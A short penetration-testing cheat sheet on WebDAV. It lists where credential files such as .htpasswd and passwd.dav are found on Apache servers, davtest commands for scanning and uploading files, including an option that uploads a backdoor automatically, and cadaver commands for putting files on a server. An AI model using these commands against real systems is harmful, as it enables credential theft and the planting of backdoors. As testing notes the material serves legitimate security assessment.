# webdav

## Cred File

```bash
# names
.htpasswd
passwd.dav

# check in
/etc/apache2
/var/www
/var/www/html
/var/www/html/*/webdav
```

## davtest (auto-scan)

```bash
davtest -url http://IP/PATH -cleanup [-auth user:pass] [-nocreate]
# cleanup: clean post testing
# nocreate: does not create directory to test in webdav root dir

# auto backdoor on successful upload
$ davtest -url http://IP/PATH [-auth user:pass] -sendbd auto

# upload file
davtest -url http://IP/PATH [auth user:pass] -uploadfile <FILE> -uploadloc <FILENAME-ON-SERVER>
```

## cadaver (manual enum)

```bash
cadaver http://IP/PATH
# will ask your user:pass

put <FILE>
```

{% embed url="https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav" %}
